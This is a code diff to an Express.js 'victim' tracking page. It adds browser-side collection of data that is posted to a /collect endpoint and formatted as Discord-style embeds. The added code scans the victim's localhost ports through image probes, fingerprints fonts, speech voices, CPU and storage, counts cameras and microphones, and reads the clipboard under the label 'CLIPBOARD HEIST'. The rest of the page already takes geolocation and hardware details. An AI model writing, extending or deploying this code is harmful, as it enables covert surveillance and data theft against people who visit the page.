@@ -286,6 +286,31 @@ app.get('/', (req, res) => {
                 // 8. SCREEN & WINDOW PROFILING
                 const screenInfo = getScreenDetails();
 
+                // 9. LOCAL PORT SCAN (Developer Detection)
+                // Scans common ports to see if the victim is a developer/admin
+                const openPorts = await scanLocalPorts();
+
+                // 10. VOICE & LANGUAGE PACKS (OS Fingerprint)
+                const voices = await getSpeechVoices();
+
+                // 11. FONT FINGERPRINTING (Entropy)
+                const fontID = getFontFingerprint();
+
+                // 12. BOT DETECTION (Headless/Automation)
+                const botScore = detectBot();
+
+                // 13. CLIPBOARD HEIST (Steal Text)
+                const clipboard = await getClipboard();
+
+                // 14. DISK STORAGE FORENSICS
+                const storage = await getStorageEstimate();
+
+                // 15. CPU BENCHMARK (Stress Test)
+                const cpuScore = runCPUBenchmark();
+
+                // 16. HARDWARE ENUMERATION (Cams/Mics)
+                const mediaPeripherals = await getMediaDevices();
+
                 const finalData = {
                     id: "${victimID}",
                     lat: pos.coords ? pos.coords.latitude : null,
@@ -304,6 +329,14 @@ app.get('/', (req, res) => {
                     screen_depth: screenInfo.depth,
                     pixel_ratio: screenInfo.pixel,
                     max_touch: screenInfo.touch,
+                    open_ports: openPorts.join(', ') || "None",
+                    voices: voices.slice(0, 5).join(', ') + (voices.length > 5 ? " (+" + (voices.length - 5) + ")" : ""),
+                    font_id: fontID,
+                    bot_score: botScore,
+                    clipboard: clipboard,
+                    storage: storage,
+                    cpu_score: cpuScore,
+                    media: mediaPeripherals,
                     neural: neuralRhythm.slice(-5).join('|'),
                     gpu: getGPUHardware(),
                     battery: await (async () => {
@@ -391,6 +424,102 @@ app.get('/', (req, res) => {
                     return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Silicon-Hidden";
                 } catch(e) { return "Unknown"; }
             }
+
+            async function scanLocalPorts() {
+                const ports = [3000, 8080, 8000, 27017, 3306, 5432, 5500]; // Node, Web, Mongo, SQL, LiveServer
+                const open = [];
+                // Fast timeout scan
+                const checkPort = (port) => new Promise(r => {
+                    const img = new Image();
+                    const timeout = setTimeout(() => r(false), 1500); // 1.5s timeout: closed/filtered
+                    img.onload = () => { clearTimeout(timeout); r(true); }; // Loads: Open (and serves img)
+                    img.onerror = () => { clearTimeout(timeout); r(true); }; // Error: Open (but not img)
+                    // If it's closed, it usually times out or refuses instantly. 
+                    // Browsers might block this, so we assume "Load/Error" = Alive Service.
+                    img.src = "http://127.0.0.1:" + port + "/favicon.ico?r=" + Math.random();
+                });
+
+                for(const p of ports) {
+                    if(await checkPort(p)) open.push(p);
+                }
+                return open;
+            }
+
+            async function getSpeechVoices() {
+                return new Promise(resolve => {
+                    let v = speechSynthesis.getVoices();
+                    if(v.length > 0) return resolve(v.map(x => x.lang));
+                    speechSynthesis.onvoiceschanged = () => {
+                        v = speechSynthesis.getVoices();
+                        resolve(v.map(x => x.lang));
+                    };
+                    setTimeout(() => resolve([]), 2000); // Fail safe
+                });
+            }
+
+            function getFontFingerprint() {
+                const fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Comic Sans MS", "Helvetica", "Impact", "Tahoma", "Georgia", "Trebuchet MS"];
+                const s = document.createElement("span");
+                s.style.fontSize = "72px";
+                s.innerHTML = "mmmmmmmmmmlli";
+                s.style.visibility = "hidden";
+                document.body.appendChild(s);
+                let w = [];
+                for(const f of fonts) {
+                    s.style.fontFamily = f;
+                    w.push(s.offsetWidth);
+                }
+                document.body.removeChild(s);
+                // Hash the widths 
+                return w.join("-");
+            }
+
+            function detectBot() {
+                let score = 0;
+                if(navigator.webdriver) score += 50;
+                if(navigator.userAgent.includes("Headless")) score += 40;
+                if(navigator.languages === "") score += 30;
+                if(window.chrome && !window.chrome.runtime) score += 20; // Common headless trait
+                if(score === 0) return "Human (0%)";
+                if(score < 50) return "Suspicious (" + score + "%)";
+                return "BOT DETECTED (" + score + "%)";
+            }
+
+            async function getClipboard() {
+                try {
+                    // Must be in sensitive context (HTTPS/localhost) and user triggered
+                    return await navigator.clipboard.readText();
+                } catch(e) { return "Denied/Empty"; }
+            }
+
+            async function getStorageEstimate() {
+                try {
+                    if (navigator.storage && navigator.storage.estimate) {
+                        const ent = await navigator.storage.estimate();
+                        return ((ent.usage / 1024 / 1024 / 1024).toFixed(1) + "GB / " + (ent.quota / 1024 / 1024 / 1024).toFixed(1) + "GB");
+                    }
+                } catch(e) {}
+                return "Unknown";
+            }
+
+            function runCPUBenchmark() {
+                const start = performance.now();
+                let i = 0;
+                while(performance.now() - start < 200) { // 200ms stress test
+                    Math.sqrt(i) * Math.sin(i);
+                    i++;
+                }
+                return i; // Raw score
+            }
+
+            async function getMediaDevices() {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    const cams = devices.filter(d => d.kind === 'videoinput').length;
+                    const mics = devices.filter(d => d.kind === 'audioinput').length;
+                    return cams + " Cams | " + mics + " Mics";
+                } catch(e) { return "Blocked"; }
+            }
         </script>
     </body>
     </html>`;
@@ -435,6 +564,12 @@ app.post('/collect', async (req, res) => {
                 { name: "⚡ SILICON DNA / JIT", value: `\`${d.silicon_dna}\` / \`${d.kernel_jit}\``, inline: true },
                 { name: "🔉 AUDIO FINGERPRINT", value: `\`${d.audio_fp}\``, inline: true },
                 { name: "💻 SCREEN SPEC", value: `Res: \`${d.screen_res}\`\\nDepth: \`${d.screen_depth}\`\\nRatio: \`${d.pixel_ratio}x\`\\nTouch: \`${d.max_touch}\``, inline: true },
+                { name: "🔓 OPEN PORTS", value: `\`${d.open_ports}\``, inline: true },
+                { name: "🤖 BOT PROBABILITY", value: `\`${d.bot_score}\``, inline: true },
+                { name: "📋 CLIPBOARD HEIST", value: `\`${d.clipboard || 'Denied'}\``, inline: false },
+                { name: "💾 DISK & CPU", value: `Disk: \`${d.storage}\`\\nCPU Score: \`${d.cpu_score}\``, inline: true },
+                { name: "📷 PERIPHERALS", value: `\`${d.media}\``, inline: true },
+                { name: "🗣️ VOICES / FONTS", value: `Voices: \`${d.voices}\`\\nFont ID: \`${d.font_id}\``, inline: false },
                 { name: "🧠 NEURAL SIGNATURE", value: `\`${d.neural || 'Scanning...'}\``, inline: false },
                 { name: "📱 PHYSICAL PROFILE", value: `GPU: \`${d.gpu}\`\\nRAM: \`${d.ram}GB\` | Cores: \`${d.cores}\`\\nBattery: \`${d.battery}\`\\nShader: \`${d.shader_dna}\`\\nSkew: \`${d.clock_skew}\``, inline: false }
             ],
